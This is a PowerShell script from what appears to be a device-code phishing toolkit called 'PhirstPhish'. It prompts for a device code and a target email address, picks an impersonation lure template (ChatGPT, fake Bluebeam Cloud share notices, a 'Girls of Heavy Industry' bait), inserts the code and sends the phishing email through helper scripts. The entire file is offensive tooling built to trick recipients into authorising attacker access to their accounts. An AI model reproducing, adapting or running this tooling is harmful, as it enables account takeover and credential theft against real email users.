[CmdletBinding()]
param(
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$userCode,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$firstUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$template

)

$code = $userCode
if(!($code)){ $code = Read-Host "Enter Device code from PhirstPhish step" }
if(!($firstUser)){ $firstUser = Read-Host "Enter target email address"}

$template = $template.Trim()

switch ($template) {
    "chatgpt" { 
        $templatePath = ".\Templates\chatgpt.htm"
        $subjects = @("ChatGPT wants you back.")
        break 
    }
    "bluebeam" { 
        $templatePath = ".\Templates\bluebeam.htm"
        $subjects = @(
            "A Bluebeam Cloud user has shared 'Big City Project: Key Details and Timeline' with you.",
            "A Bluebeam Cloud user has shared 'Invitation: Steakholder Meeting on Downtown Development Plans. B.Y.O.Beef' with you.",
            "A Bluebeam Cloud user has shared 'Progress Update: Where are the gay robots??' with you.",
            "A Bluebeam Cloud user has shared 'Performance Improvement Plan and General Guidelines.' with you."
        )
        break 
    }
    "blonde" { 
        $templatePath = ".\Templates\blonde.htm"
        $subjects = @("The Girls of Heavy Industry 2024.")
        break 
    }
    "fondo" { 
        $templatePath = ".\Templates\fondo.htm"
        $subjects = @("The Girls of Heavy Industry 2024.")
        break 
    }
    default {
        Write-Host "No matching template found for '$template'."
        # Handle the case where no valid template is found
        # This could be either setting a default template or exiting the script
    }
}



Write-Output "$template template selected. Replacing code."
.\Replace.ps1 -code $code -template $template

$messageContent2 = Get-Content $templatePath -Raw

Write-Output "Sending first phish."
if(!($subject)){ $subject = Get-Random -InputObject $subjects} 
.\Final.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject
